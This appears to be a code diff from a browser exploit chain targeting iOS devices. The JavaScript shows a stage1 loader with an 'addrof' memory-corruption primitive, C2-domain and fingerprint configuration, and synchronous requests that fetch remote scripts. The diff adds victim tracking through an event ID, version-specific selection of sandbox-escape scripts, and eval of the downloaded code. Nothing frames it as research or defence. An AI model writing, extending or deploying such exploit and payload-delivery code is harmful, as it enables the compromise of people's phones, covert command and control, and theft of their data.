@@ -240,7 +240,8 @@ self[1] = boxed_arr;
       try 
       {
           let url = "";
-          url = host + "/" + fname + "?v=" + Date.now() + "?v=" + Date.now();
+          url = host + "/" + fname + "?v=" + Date.now();
+          if (self.EVENT_ID) url += "&ctx=" + self.EVENT_ID;
           print("trying to fetch from:" + url);
           let xhr = new XMLHttpRequest();
           xhr.open("GET", `${url}` , false);
@@ -286,6 +287,7 @@ self[1] = boxed_arr;
           self.C2_DOMAIN = data.c2Domain || "";
           self.INTEGRATION_ID = data.integrationId || "";
           self.FINGERPRINT = data.fingerprint || "";
+            self.EVENT_ID = data.eventId || "";
           self.EXTRACT_PATH = data.extractPath || "/extract.js.enc";
           print("inside stage1");
           p.addrof = function addrof(o) {
@@ -929,8 +931,9 @@ self[1] = boxed_arr;
           log(`-`.repeat(0x28));
           try {
             
-            const sbx0_script = getJS('sbx0.js');
+            const sbx0_script = getJS('sbx0/sbx0_' + ios_version[0] + '.' + ios_version[1] + '.js');
             log("after get js");
+            self.postMessage({ type: 'redirect' });
             eval(sbx0_script);
         } catch (e) {
             log(btoa(e));
